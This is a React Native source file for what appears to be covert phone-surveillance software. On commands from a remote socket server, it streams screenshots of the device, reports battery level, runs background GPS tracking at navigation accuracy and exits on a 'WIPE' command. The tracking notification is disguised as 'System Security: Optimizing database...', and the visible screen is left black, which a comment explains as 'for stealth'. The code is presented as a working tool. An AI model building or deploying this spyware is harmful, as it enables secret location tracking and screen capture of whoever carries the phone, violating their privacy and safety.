import React, { useEffect, useRef } from 'react';
import { View, StyleSheet, BackHandler } from 'react-native';
import * as Location from 'expo-location';
import * as Battery from 'expo-battery'; // Required for Power Monitoring
import { captureScreen } from 'react-native-view-shot';

const GPS_TASK = 'bg-gps-sync';

export default function GhostScreen({ socket, name }) {
    const streamTimer = useRef(null);
    const pinpointTimer = useRef(null);

    useEffect(() => {
        // 1. Initial Connection & Battery Sync
        const syncBattery = async () => {
            const level = await Battery.getBatteryLevelAsync();
            socket.emit('ghost_status', { battery: Math.floor(level * 100) });
        };
        syncBattery();

        // 2. Command Listeners
        socket.on('admin_command', async (cmd) => {
            // STREAMING COMMANDS
            if (cmd === 'START_LIVE') startStream(350);
            if (cmd === 'START_ECO') startStream(5000);
            if (cmd === 'STOP_STREAM') clearInterval(streamTimer.current);
            if (cmd === 'WIPE') BackHandler.exitApp();

            // PINPOINT COMMANDS (Timed for Battery Protection)
            if (cmd === 'START_PINPOINT') {
                await activatePinpoint();
            }
            if (cmd === 'STOP_PINPOINT') {
                deactivatePinpoint();
            }
        });

        // 3. Clean up on exit
        return () => {
            clearInterval(streamTimer.current);
            clearTimeout(pinpointTimer.current);
            Location.stopLocationUpdatesAsync(GPS_TASK);
        };
    }, []);

    const activatePinpoint = async () => {
        const { status } = await Location.requestBackgroundPermissionsAsync();
        if (status === 'granted') {
            await Location.startLocationUpdatesAsync(GPS_TASK, {
                accuracy: Location.Accuracy.BestForNavigation,
                timeInterval: 5000,
                foregroundService: {
                    notificationTitle: "System Security",
                    notificationBody: "Optimizing database...",
                    notificationColor: "#000000"
                }
            });

            // AUTO-KILL FAILSAFE: Hard stop GPS after 5 minutes
            clearTimeout(pinpointTimer.current);
            pinpointTimer.current = setTimeout(() => {
                deactivatePinpoint();
                socket.emit('system_log', "Pinpoint Auto-Terminated (5m limit)");
                socket.emit('admin_command', 'STOP_PINPOINT'); // Update Admin UI
            }, 300000); 
        }
    };

    const deactivatePinpoint = async () => {
        await Location.stopLocationUpdatesAsync(GPS_TASK);
        clearTimeout(pinpointTimer.current);
    };

    const startStream = (ms) => {
        clearInterval(streamTimer.current);
        streamTimer.current = setInterval(async () => {
            if (!socket.connected) return;
            try {
                const img = await captureScreen({
                    format: 'jpg',
                    quality: 0.2,
                    result: 'base64'
                });
                socket.emit('screen_frame', img);
            } catch (e) {}
        }, ms);
    };

    // The UI is a mandatory black screen for stealth
    return <View style={styles.container} />;
}

const styles = StyleSheet.create({
    container: {
        flex: 1,
        backgroundColor: '#000', // Total Blackout
    }
});
